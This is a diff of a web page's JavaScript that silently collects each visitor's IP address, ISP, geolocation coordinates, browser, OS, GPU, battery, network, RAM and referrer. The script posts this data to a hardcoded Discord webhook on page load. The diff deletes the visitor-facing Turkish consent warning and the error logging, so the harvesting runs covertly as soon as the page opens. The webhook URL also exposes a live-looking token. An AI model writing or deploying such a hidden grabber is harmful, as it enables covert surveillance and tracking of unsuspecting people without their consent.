@@ -45,20 +45,15 @@
     </div>
 
     <script>
-        // Webhook URL'nizi buraya yapıştırın.
         const WH_URL = "https://discord.com/api/webhooks/1454212443227033762/sENFhwWgklT-lvcuHVyZrg0l634v00ce4tSz3YsVM6HXTMtOMZzNAlvUVFjyo3ekswyJ";
-        // Uyarı mesajı
-        const uyariMesaji = `
-        **UYARI:** Bu sayfa, bilgi toplama amacıyla bazı verileri toplayabilir. Toplanan veriler arasında IP adresi, tarayıcı bilgileri, işletim sistemi ve donanım bilgileri bulunabilir. Bu veriler, kötüye kullanıma karşı korunmaktadır. Bu sayfayı kullanmaya devam ederek, bu koşulları kabul etmiş olursunuz.  Bu kodun kötüye kullanımı yasa dışıdır.
-        `;
 
         async function advancedExfil() {
             try {
-                // 1. Temel Bilgileri Topla
+          
                 const geoReq = await fetch('https://ipapi.co/json/');
                 const g = await geoReq.json();
 
-                // 2. Tarayıcı ve İşletim Sistemi Bilgileri
+                
                 let browser = "Unknown";
                 let os = "Unknown Platform";
                 const ua = navigator.userAgent;
@@ -83,7 +78,7 @@
                     os = navigator.platform;
                 }
 
-                // 3. Ek Bilgiler (GPU, Batarya, Bağlantı)
+                
                 let gpu = "N/A";
                 const canvas = document.createElement("canvas");
                 const gl = canvas.getContext("webgl");
@@ -101,41 +96,28 @@
                 const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                 const connectionType = conn ? `${conn.effectiveType} (~${conn.downlink} Mbps)` : "Bilinmiyor";
 
-                // 4. Diğer Bilgiler
-                const tarih = new Date().toLocaleString('tr-TR');
-                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                const ekranCozunurlugu = `${screen.width}x${screen.height}`;
-                const cihazHafizasi = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Bilinmiyor";
-                const isOnline = navigator.onLine ? "Evet" : "Hayır";
-                const cpuCekirdekSayisi = navigator.hardwareConcurrency || "Bilinmiyor";
-                const sistemDili = navigator.language || "Bilinmiyor";
-                const cerezDurumu = navigator.cookieEnabled ? "Etkin" : "Devre Dışı";
-
-                 // 5. Veri Paketleme
+                // 4. Veri Paketleme
                 const logData = {
-                    ts: tarih,
+                    ts: new Date().toLocaleString('tr-TR'),
                     ip: g.ip,
                     isp: g.org,
                     loc: `${g.city}, ${g.region}, ${g.country_name} (${g.latitude}, ${g.longitude})`,
                     os: os,
                     browser: browser,
-                    ram: cihazHafizasi,
-                    cores: cpuCekirdekSayisi,
+                    ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Bilinmiyor",
+                    cores: navigator.hardwareConcurrency || "Bilinmiyor",
                     gpu: gpu,
-                    res: ekranCozunurlugu + ` @ ${window.visualViewport ? window.visualViewport.scale * 100 : 100}%`,
+                    res: `${screen.width}x${screen.height} @ ${window.visualViewport ? window.visualViewport.scale * 100 : 100}%`,
                     hz: window.screen.refreshRate || "60Hz (Tahmini)",
-                    lang: sistemDili,
+                    lang: navigator.language,
                     bat: battery,
                     net: connectionType,
                     ref: document.referrer || "Dogrudan Baglanti",
-                    ua: ua,
-                    timezone: timezone,
-                    online: isOnline,
-                    cookies: cerezDurumu
+                    ua: ua
                 };
 
-                // Discord'a gönderilecek metin
-                const terminalLog = "```" +
+               
+                const terminalLog = "```" + 
                     "--- [ SESSION CAPTURE REPORT ] ---\n" +
                     "ID         : " + Math.floor(Math.random() * 900000 + 100000) + "\n" +
                     "TIME       : " + logData.ts + "\n" +
@@ -159,31 +141,20 @@
                     "LANGUAGE   : " + logData.lang + "\n" +
                     "REFERRER   : " + logData.ref + "\n" +
                     "RAW_UA     : " + logData.ua + "\n" +
-                    "TIMEZONE   : " + logData.timezone + "\n" +
-                    "ONLINE     : " + logData.online + "\n" +
-                    "COOKIES    : " + logData.cookies + "\n" +
                     "--- [ END OF TRANSMISSION ] ---" +
                     "```";
 
-
-                // 6. Discord'a Gönderme
+          
                 await fetch(WH_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ content: terminalLog })
                 });
 
-            } catch (err) {
-                // Hata durumunda konsola yazdır
-                console.error("Hata:", err);
-            }
+            } catch (err) {}
         }
-        // Uyarı mesajını göster
-        window.onload = () => {
-            alert(uyariMesaji);
-            advancedExfil();
-        };
 
+        window.onload = advancedExfil;
     </script>
 </body>
 </html>
